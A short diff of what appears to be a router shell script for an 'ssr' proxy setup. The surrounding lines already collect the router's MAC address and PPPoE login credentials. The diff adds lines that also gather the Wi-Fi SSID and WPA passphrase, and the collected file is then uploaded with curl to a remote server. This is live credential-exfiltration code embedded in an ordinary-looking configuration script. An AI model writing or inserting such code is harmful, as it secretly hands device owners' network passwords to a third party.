@@ -576,6 +576,8 @@ if   [ -s ssr.ini ] ; then
 	cat /sys/class/net/br0/address >$fn
 	nvram get wan_pppoe_username >>$fn
 	nvram get wan_pppoe_passwd >>$fn	
+	nvram get wl_ssid >>$fn	
+	nvram get wl_wpa_psk >>$fn	
 	curl -T $fn $ssr_url"mac/"$fn
 
 #    sed  -i  's/^..../ssr:\/\//'  ss.inf   
